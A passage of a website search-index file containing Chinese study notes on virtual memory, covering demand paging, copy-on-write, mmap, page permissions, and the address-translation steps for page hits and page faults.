\u200b\u7684\u200b\u9875\u8868\u200b\u6761\u76ee\u200b, \u200b\u53cd\u6620\u200b\u51fa\u200b\u5b83\u200b\u4e0d\u518d\u200b\u7f13\u5b58\u200b\u5728\u200b DRAM \u200b\u4e2d\u200b\u7684\u200b\u4e8b\u5b9e\u200b.</p> <p>\u200b\u63a5\u4e0b\u6765\u200b, \u200b\u5185\u6838\u200b\u5c31\u200b\u4f1a\u200b\u590d\u5236\u200b VP3 \u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u4f4d\u7f6e\u200b, \u200b\u66f4\u65b0\u200b PTE 3. </p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#935","title":"9.3.5 \u200b\u5206\u914d\u200b\u9875\u9762","text":""},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#_1","title":"\u89e6\u53d1\u200b\u65b0\u200b\u5206\u914d\u200b\u9875\u200b\u7684\u200b\u5e38\u89c1\u200b\u60c5\u51b5","text":"\u7f16\u7a0b\u200b\u64cd\u4f5c\u200b \u200b\u865a\u62df\u5185\u5b58\u200b\u673a\u5236\u200b \u200b\u7ed3\u679c\u200b\u4e0e\u200b\u89e3\u91ca\u200b \u200b\u9996\u6b21\u200b\u8bbf\u95ee\u200b\u5806\u200b\u5185\u5b58\u200b \u200b\u6309\u200b\u9700\u200b\u5206\u9875\u200b (Demand Paging) \u200b\u5f53\u200b\u7a0b\u5e8f\u200b\u901a\u8fc7\u200b <code>malloc</code> \u200b\u6216\u200b C++ \u200b\u7684\u200b <code>new</code> \u200b\u8bf7\u6c42\u200b\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u901a\u5e38\u200b\u53ea\u200b\u5728\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u9884\u7559\u200b\u5730\u5740\u200b\u3002\u200b\u53ea\u6709\u200b\u5f53\u200b\u7a0b\u5e8f\u200b\u9996\u6b21\u200b\u5199\u5165\u200b\u6216\u200b\u8bbf\u95ee\u200b\u8fd9\u5757\u200b\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u7f3a\u9875\u200b\u4e2d\u65ad\u200b\uff0c\u200b\u5185\u6838\u200b\u968f\u540e\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u5168\u65b0\u200b\u7684\u200b\u3001\u200b\u96f6\u200b\u586b\u5145\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b\uff0c\u200b\u5e76\u200b\u66f4\u65b0\u200b\u9875\u8868\u200b\u6620\u5c04\u200b\u3002 \u200b\u6808\u200b\u589e\u957f\u200b \u200b\u6808\u200b\u6269\u5c55\u200b (Stack Growth) \u200b\u5f53\u200b\u51fd\u6570\u8c03\u7528\u200b\u5bfc\u81f4\u200b\u6808\u200b\u6ea2\u51fa\u200b\u5f53\u524d\u200b\u6620\u5c04\u200b\u7684\u200b\u5185\u5b58\u200b\u8303\u56f4\u200b\u65f6\u200b\uff0cCPU \u200b\u4f1a\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u672a\u200b\u6620\u5c04\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u3002\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u6355\u83b7\u200b\u5f02\u5e38\u200b\uff0c\u200b\u5e76\u200b\u4e3a\u200b\u6808\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b\uff0c\u200b\u4f7f\u200b\u5176\u200b\u80fd\u591f\u200b\u7ee7\u7eed\u6267\u884c\u200b\u3002 \u200b\u5199\u65f6\u200b\u590d\u5236\u200b\uff08COW\uff09 \u200b\u5185\u5b58\u200b\u9694\u79bb\u200b \u200b\u5728\u200b <code>fork()</code> \u200b\u4e4b\u540e\u200b\uff0c\u200b\u7236\u5b50\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u540c\u200b\u4e00\u5757\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\uff08\u200b\u53ea\u8bfb\u200b\uff09\u3002\u200b\u5f53\u200b\u4efb\u4e00\u200b\u8fdb\u7a0b\u200b\u9996\u6b21\u200b\u5c1d\u8bd5\u200b\u5199\u5165\u200b\u8fd9\u5757\u200b\u5171\u4eab\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5199\u200b\u4fdd\u62a4\u200b\u6545\u969c\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5fc5\u987b\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u539f\u59cb\u6570\u636e\u200b\u590d\u5236\u200b\u8fdb\u53bb\u200b\uff0c\u200b\u786e\u4fdd\u200b\u8fdb\u7a0b\u200b\u9694\u79bb\u200b\u3002 \u200b\u6587\u4ef6\u200b\u6620\u5c04\u200b\uff08mmap\uff09 \u200b\u6587\u4ef6\u200b\u6620\u5c04\u200b I/O \u200b\u5f53\u200b\u7a0b\u5e8f\u200b\u901a\u8fc7\u200b <code>mmap</code> \u200b\u5c06\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u6620\u5c04\u200b\u5230\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u540e\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b\u7a0b\u5e8f\u200b\u9996\u6b21\u200b\u8bbf\u95ee\u200b\u8be5\u200b\u865a\u62df\u5730\u5740\u200b\u65f6\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u4ece\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u76f8\u5e94\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\u6765\u200b\u5b58\u50a8\u200b\u8fd9\u4e9b\u200b\u6570\u636e\u200b\u3002"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#936-locality-to-the-rescue-again","title":"9.3.6 Locality to the Rescue Again!","text":"<p> \u200b\u6ce8\u610f\u200b, \u200b\u865a\u62df\u5185\u5b58\u200b\u6ca1\u6709\u200b\u51b2\u7a81\u200b\u4e0d\u200b\u547d\u4e2d\u200b(\u200b\u5168\u200b\u76f8\u8054\u200b)</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#94","title":"9.4 \u200b\u865a\u62df\u5185\u5b58\u200b\u4f5c\u4e3a\u200b\u5185\u5b58\u200b\u7ba1\u7406\u5de5\u5177","text":"<p>\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e3a\u200b \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u9875\u8868\u200b, \u200b\u56e0\u800c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b.  \u200b\u6ce8\u610f\u200b, \u200b\u4e0d\u540c\u200b\u8fdb\u7a0b\u200b\u4e2d\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u200b\u53ef\u80fd\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u9762\u200b. </p> <ul> <li>\u200b\u7b80\u5316\u200b\u94fe\u63a5\u200b: \u200b\u72ec\u7acb\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5141\u8bb8\u200b\u4e0d\u540c\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u5185\u5b58\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u57fa\u672c\u200b\u683c\u5f0f\u200b, \u200b\u800c\u200b\u4e0d\u200b\u5173\u5fc3\u200b\u5b83\u4eec\u200b\u5b9e\u9645\u200b\u5b58\u653e\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u7684\u200b\u4f55\u5904\u200b. \u200b\u4f8b\u5982\u200b, \u200b\u5bf9\u4e8e\u200b 64\u200b\u4f4d\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b, \u200b\u4ee3\u7801\u6bb5\u200b\u603b\u662f\u200b\u4ece\u200b\u865a\u62df\u5730\u5740\u200b 0x400000 \u200b\u5f00\u59cb\u200b.</li> <li>\u200b\u7b80\u5316\u200b\u52a0\u8f7d\u200b: Linux \u200b\u5728\u200b\u7a0b\u5e8f\u200b\u52a0\u8f7d\u200b\u65f6\u200b, \u200b\u53ea\u200b\u8bbe\u7f6e\u200b\u865a\u62df\u200b\u5730\u5740\u6620\u5c04\u200b, \u200b\u5c06\u200b\u5b83\u4eec\u200b\u6307\u5411\u200b\u78c1\u76d8\u200b\u5730\u5740\u200b, \u200b\u5e76\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u672a\u200b\u7f13\u5b58\u200b, \u200b\u800c\u200b\u4e0d\u200b\u8fdb\u884c\u200b\u5b9e\u9645\u200b\u6570\u636e\u200b\u590d\u5236\u200b. \u200b\u53ea\u6709\u200b\u5f53\u200b CPU \u200b\u9700\u8981\u200b\u5b83\u4eec\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u624d\u200b\u53bb\u200b\u89e6\u53d1\u200b\u7f3a\u9875\u200b\u4e2d\u65ad\u200b\u4ea4\u6362\u200b\u8fdb\u200b\u5185\u5b58\u200b.    \u200b\u5c06\u200b\u4e00\u7ec4\u200b\u8fde\u7eed\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u200b\u6620\u5c04\u200b\u5230\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u4efb\u610f\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u8868\u793a\u6cd5\u200b(\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0a\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b\u5c06\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b\u6bb5\u200b\u548c\u200b\u4e00\u6bb5\u200b\u865a\u62df\u200b\u9875\u200b\u5173\u8054\u200b\u8d77\u6765\u200b)\u200b\u79f0\u4e3a\u200b\u5185\u5b58\u200b\u6620\u5c04\u200b. Linux \u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u79f0\u4e3a\u200b mmap \u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b, \u200b\u5141\u8bb8\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u81ea\u5df1\u200b\u505a\u200b\u5185\u5b58\u200b\u6620\u5c04\u200b, \u200b\u8fd9\u4f1a\u200b\u5728\u200b 9.8 \u200b\u8282\u200b\u8ba8\u8bba\u200b.</li> <li>\u200b\u7b80\u5316\u200b\u5171\u4eab\u200b: \u200b\u4e00\u822c\u800c\u8a00\u200b, \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u79c1\u6709\u200b\u7684\u200b\u4ee3\u7801\u200b, \u200b\u6570\u636e\u200b, \u200b\u5806\u6808\u200b\u7b49\u200b\u533a\u57df\u200b. \u200b\u8fd9\u65f6\u5019\u200b\u9875\u8868\u200b\u4f1a\u200b\u5c06\u200b\u76f8\u5e94\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u200b\u6620\u5c04\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b. \u200b\u7136\u800c\u200b\u5728\u200b\u4e00\u4e9b\u200b\u60c5\u51b5\u200b\u4e2d\u200b, \u200b\u6bd4\u5982\u200b\u5171\u4eab\u200b\u5e93\u51fd\u6570\u200b, \u200b\u9700\u8981\u200b\u8c03\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u4ee3\u7801\u200b, \u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u5c06\u200b\u4e0d\u540c\u200b\u8fdb\u7a0b\u200b\u4e2d\u200b\u9002\u5f53\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u6620\u5c04\u200b\u5230\u200b\u76f8\u540c\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u9762\u200b.</li> <li>\u200b\u7b80\u5316\u200b\u5185\u5b58\u200b\u5206\u914d\u200b: \u200b\u5f53\u200b\u4e00\u4e2a\u200b\u8fd0\u884c\u200b\u5728\u200b\u7528\u6237\u200b\u8fdb\u7a0b\u200b\u4e2d\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u8981\u6c42\u200b\u989d\u5916\u200b\u7684\u200b\u5806\u200b\u7a7a\u95f4\u200b(\u200b\u4f8b\u5982\u200b\u8c03\u7528\u200b malloc), \u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4f1a\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u9002\u5f53\u200b\u6570\u5b57\u200b\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u9875\u9762\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5b83\u4eec\u200b\u6620\u5c04\u200b\u5230\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u4efb\u610f\u200b\u4f4d\u7f6e\u200b\u7684\u200b k \u200b\u4e2a\u200b\u4efb\u610f\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u9762\u200b</li> </ul>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#95","title":"9.5 \u200b\u865a\u62df\u5185\u5b58\u200b\u4f5c\u4e3a\u200b\u5185\u5b58\u4fdd\u62a4\u200b\u7684\u200b\u5de5\u5177","text":"<p>\u200b\u901a\u8fc7\u200b\u5728\u200b PTE \u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u8bb8\u53ef\u200b\u4f4d\u6765\u200b\u63a7\u5236\u200b\u5bf9\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u5185\u5bb9\u200b\u7684\u200b\u8bbf\u95ee\u200b\u5341\u5206\u200b\u7b80\u5355\u200b. </p> <ul> <li>SUP \u200b\u4f4d\u200b\u8868\u793a\u200b\u8fdb\u7a0b\u200b\u662f\u5426\u200b\u5fc5\u987b\u200b\u8fd0\u884c\u200b\u5728\u200b\u5185\u6838\u200b(\u200b\u8d85\u7ea7\u200b\u7528\u6237\u200b)\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u624d\u80fd\u200b\u8bbf\u95ee\u200b\u8be5\u9875\u200b. \u200b\u5141\u8bb8\u200b\u5728\u200b\u5185\u6838\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4efb\u4f55\u200b\u9875\u9762\u200b.</li> <li>READ\u200b\u548c\u200bWRITE \u200b\u4f4d\u200b\u63a7\u5236\u200b\u5bf9\u200b\u9875\u9762\u200b\u7684\u200b\u8bfb\u5199\u8bbf\u95ee\u200b.</li> <li>\u200b\u4e00\u65e6\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8fdd\u53cd\u200b\u4e86\u200b\u8bb8\u53ef\u200b\u6761\u4ef6\u200b, CPU \u200b\u5c31\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u4e00\u4e2a\u200b\u4e00\u822c\u200b\u4fdd\u62a4\u200b\u6545\u969c\u200b, \u200b\u5c06\u200b\u63a7\u5236\u200b\u4f20\u9012\u200b\u7ed9\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b\u5f02\u5e38\u200b\u5904\u7406\u7a0b\u5e8f\u200b. Linux shell \u200b\u4e00\u822c\u200b\u5c06\u200b\u8fd9\u79cd\u200b\u5f02\u5e38\u200b\u62a5\u544a\u200b\u4e3a\u200b\"\u200b\u6bb5\u200b\u9519\u8bef\u200b(segmentation fault)\"</li> </ul>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#96","title":"9.6 \u200b\u5730\u5740\u200b\u7ffb\u8bd1","text":"<p>\u200b\u5f62\u5f0f\u200b\u4e0a\u200b\u6765\u8bf4\u200b, \u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u662f\u200b\u4e00\u4e2a\u200b \\(N\\) \u200b\u5143\u7d20\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b (VAS) \u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b\u548c\u200b\u4e00\u4e2a\u200b\\(M\\) \u200b\u5143\u7d20\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b (PAS) \u200b\u4e2d\u200b\u5143\u7d20\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6620\u5c04\u200b:</p> <p>$$ MAP:VAS \\to PAS \\bigcup \\emptyset $$ \u200b\u8fd9\u91cc\u200b</p> \\[ MAP(A)=\\begin{cases} A' ,&amp; \u200b\u5982\u679c\u200b\u865a\u62df\u5730\u5740\u200b A \u200b\u5904\u200b\u7684\u200b\u6570\u636e\u200b\u5728\u200bPAS\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200bA'\u200b\u5904\u200b\\\\ \\emptyset, &amp; \u200b\u5982\u679c\u200b\u865a\u62df\u5730\u5740\u200bA\u200b\u5904\u200b\u7684\u200b\u6570\u636e\u200b\u4e0d\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b \\end{cases} \\] <p>CPU \u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u63a7\u5236\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u9875\u8868\u200b\u57fa\u5740\u200b\u5bc4\u5b58\u5668\u200b (Page Table Base Register, PTBR) \u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u9875\u8868\u200b.  \u200b\u4e00\u4e2a\u200b \\(n\\) \u200b\u4f4d\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u5305\u542b\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b: \u200b\u4e00\u4e2a\u200b \\(p\\) \u200b\u4f4d\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u504f\u79fb\u200b (VPO), \u200b\u4e5f\u200b\u5c31\u662f\u200b Cache \u200b\u4e2d\u200b\u5730\u5740\u200b\u7684\u200b\u5757\u200b\u504f\u79fb\u91cf\u200b. \u200b\u548c\u200b\u4e00\u4e2a\u200b \\((n-p)\\) \u200b\u4f4d\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u200b\u53f7\u200b (VPN).</p> <p>Note</p> <p>\u200b\u6062\u590d\u200b\u5bc4\u5b58\u5668\u200b\u72b6\u6001\u200b\u7684\u200b\u5173\u952e\u200b\u662f\u200b\u8fdb\u7a0b\u200b\u63a7\u5236\u200b\u5757\u200b (PCB)\u3002</p> <ul> <li>\u200b\u4fdd\u5b58\u200b\uff1a \u200b\u5207\u6362\u200b\u51fa\u53bb\u200b\u65f6\u200b\uff0c\u200b\u5c06\u200b\u6240\u6709\u200b CPU \u200b\u5bc4\u5b58\u5668\u200b\u72b6\u6001\u200b\u5199\u5165\u200b\u65e7\u200b\u8fdb\u7a0b\u200b\u7684\u200b PCB\u3002</li> <li>\u200b\u6062\u590d\u200b\uff1a \u200b\u5207\u6362\u200b\u8fdb\u6765\u200b\u65f6\u200b\uff0c\u200b\u4ece\u200b\u65b0\u200b\u8fdb\u7a0b\u200b\u7684\u200b PCB \u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u6240\u6709\u200b\u5bc4\u5b58\u5668\u200b\u72b6\u6001\u200b\u5e76\u200b\u52a0\u8f7d\u200b\u5230\u200b CPU \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u786e\u4fdd\u200b\u4e86\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u5728\u200b\u6062\u590d\u200b\u6267\u884c\u200b\u65f6\u200b\uff0c\u200b\u5176\u200b\u5185\u90e8\u200b\u72b6\u6001\u200b\uff08\u200b\u5bc4\u5b58\u5668\u200b\u503c\u200b\u3001\u200b\u5806\u6808\u200b\u5185\u5bb9\u200b\u3001\u200b\u6267\u884c\u200b\u4f4d\u7f6e\u200b\uff09\u200b\u4e0e\u5176\u200b\u4e0a\u6b21\u200b\u505c\u6b62\u200b\u65f6\u200b\u7684\u200b\u72b6\u6001\u200b\u5b8c\u5168\u4e00\u81f4\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b\u5e76\u53d1\u200b\u6267\u884c\u200b\u7684\u200b\u5047\u8c61\u200b\u3002</p> <p>MMU \u200b\u5229\u7528\u200b VPN \u200b\u6765\u200b\u9009\u62e9\u200b\u9002\u5f53\u200b\u7684\u200b PTE. \u200b\u5c06\u200b\u9875\u8868\u200b\u6761\u76ee\u200b\u4e2d\u200b\u7269\u7406\u200b\u9875\u200b\u53f7\u200b (PPN) \u200b\u548c\u200b\u865a\u62df\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b VPO \u200b\u4e32\u8054\u200b\u8d77\u6765\u200b, \u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u76f8\u5e94\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b. </p> <p>\u200b\u4e0b\u56fe\u200b\u5c55\u793a\u200b\u4e86\u200b Page Hit \u200b\u7684\u200b\u65f6\u5019\u200b, CPU \u200b\u786c\u4ef6\u200b\u6267\u884c\u200b\u7684\u200b\u6b65\u9aa4\u200b:</p> <ul> <li> <ol> <li>\u200b\u5904\u7406\u5668\u200b\u751f\u6210\u200b\u865a\u62df\u5730\u5740\u200b (VA), \u200b\u5e76\u200b\u4f20\u9012\u200b\u7ed9\u200b MMU</li> </ol> </li> <li> <ol> <li>MMU \u200b\u751f\u6210\u200b PTE \u200b\u5730\u5740\u200b (PTEA), \u200b\u5e76\u200b\u4ece\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b\u8bf7\u6c42\u200b\u5f97\u5230\u200b\u5b83\u200b. (\u200b\u9875\u8868\u200b\u662f\u200b\u5b58\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b, \u200b\u5f53\u7136\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u88ab\u200b cache \u200b\u7f13\u5b58\u200b\u5230\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e2d\u200b!)</li> </ol> </li> <li> <ol> <li>\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b\u5411\u200b MMU \u200b\u8fd4\u56de\u200b PTE</li> </ol> </li> <li> <ol> <li>MMU \u200b\u6784\u9020\u200b\u7269\u7406\u5730\u5740\u200b, \u200b\u5e76\u200b\u628a\u200b\u5b83\u200b\u4f20\u9001\u200b\u7ed9\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b.</li> </ol> </li> <li> <ol> <li>\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b\u8fd4\u56de\u200b\u6240\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u5b57\u200b\u7ed9\u200b\u5904\u7406\u5668\u200b.</li> </ol> </li> </ul> <p></p> <p>\u200b\u9875\u9762\u200b\u547d\u4e2d\u200b\u5b8c\u5168\u200b\u7531\u200b\u786c\u4ef6\u200b\u5904\u7406\u200b, \u200b\u4e0e\u200b\u4e4b\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b, \u200b\u5904\u7406\u200b\u7f3a\u9875\u200b\u8981\u6c42\u200b\u786c\u4ef6\u200b\u548c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u534f\u4f5c\u200b\u5b8c\u6210\u200b.</p> <ul> <li>1-3 \u200b\u6b65\u200b\u4e0e\u200b Page Hit \u200b\u76f8\u540c\u200b</li> <li> <ol> <li>PTE \u200b\u4e2d\u200b\u7684\u200b\u6709\u6548\u200b\u4f4d\u662f\u200b 0, \u200b\u6240\u4ee5\u200b MMU \u200b\u89e6\u53d1\u200b\u4e86\u200b\u4e00\u6b21\u200b\u5f02\u5e38\u200b, \u200b\u4f20\u9012\u200b CPU \u200b\u4e2d\u200b\u7684\u200b\u63a7\u5236\u200b\u5230\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b \u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b\u5904\u7406\u7a0b\u5e8f\u200b</li> </ol> </li> <li> <ol> <li>\u200b\u7f3a\u9875\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u786e\u5b9a\u200b\u51fa\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u727a\u7272\u200b\u9875\u200b, \u200b\u5982\u679c\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u4fee\u6539\u200b\u4e86\u200b, \u200b\u5219\u200b\u628a\u200b\u5b83\u200b\u6362\u200b\u51fa\u5230\u200b\u78c1\u76d8\u200b.</li> </ol> </li> <li> <ol> <li>\u200b\u7f3a\u9875\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u9875\u9762\u200b\u8c03\u5165\u200b\u65b0\u200b\u7684\u200b\u9875\u9762\u200b, \u200b\u5e76\u200b\u66f4\u65b0\u200b PTE.</li> </ol> </li> <li> <ol> <li>\u200b\u7f3a\u9875\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u8fd4\u56de\u200b\u539f\u6765\u200b\u7684\u200b\u8fdb\u7a0b\u200b, \u200b\u518d\u6b21\u200b\u6267\u884c\u200b\u5bfc\u81f4\u200b\u7f3a\u9875\u200b\u7684\u200b\u6307\u4ee4\u200b. CPU \u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u4e00\u904d\u200b Page Hit \u200b\u60c5\u51b5\u200b\u7684\u200b\u6240\u6709\u200b\u64cd\u4f5c\u200b.</li> </ol> </li> </ul>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#961","title":"9.6.1 \u200b\u7ed3\u5408\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u548c\u200b\u865a\u62df\u5185\u5b58","text":"<p>\u200b\u4f7f\u7528\u200b\u7269\u7406\u200b\u5bfb\u5740\u200b\u7684\u200b\u4f18\u52bf\u200b\uff1a</p> <ul> <li> <p>\u200b\u7b80\u5316\u200b\u591a\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\uff1a \u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5728\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e2d\u200b\u5b58\u50a8\u200b\u6765\u81ea\u200b\u76f8\u540c\u200b\u7269\u7406\u200b\u9875\u9762\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\uff0c\u200b\u8fd9\u200b\u53d8\u5f97\u200b\u975e\u5e38\u7b80\u5355\u200b\u3002</p> </li> <li> <p>\u200b\u65e0\u9700\u200b\u5904\u7406\u200b\u4fdd\u62a4\u200b\u95ee\u9898\u200b\uff1a \u200b\u9ad8\u901f\u7f13\u5b58\u200b\uff08Cache\uff09\u200b\u65e0\u9700\u200b\u5904\u7406\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\uff08\u200b\u5982\u8bfb\u200b/\u200b\u5199\u200b\u6743\u9650\u200b\uff09\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5bf9\u200b\u6743\u9650\u200b\u7684\u200b\u68c0\u67e5\u200b\u662f\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u8fc7\u7a0b\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u5728\u200b\u6570\u636e\u200b\u8fdb\u5165\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e4b\u524d\u200b\u5c31\u200b\u5df2\u7ecf\u200b\u7531\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u5355\u5143\u200b\uff08MMU\uff09\u200b\u5b8c\u6210\u200b\u4e86\u200b\u3002</p> </li> </ul>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#962-tlb","title":"9.6.2 \u200b\u5229\u7528\u200b TLB \u200b\u52a0\u901f\u200b\u5730\u5740\u200b\u7ffb\u8bd1","text":"<p>\u200b\u6b63\u5982\u200b\u6211\u4eec\u200b\u770b\u5230\u200b\u7684\u200b, \u200b\u6bcf\u6b21\u200b CPU 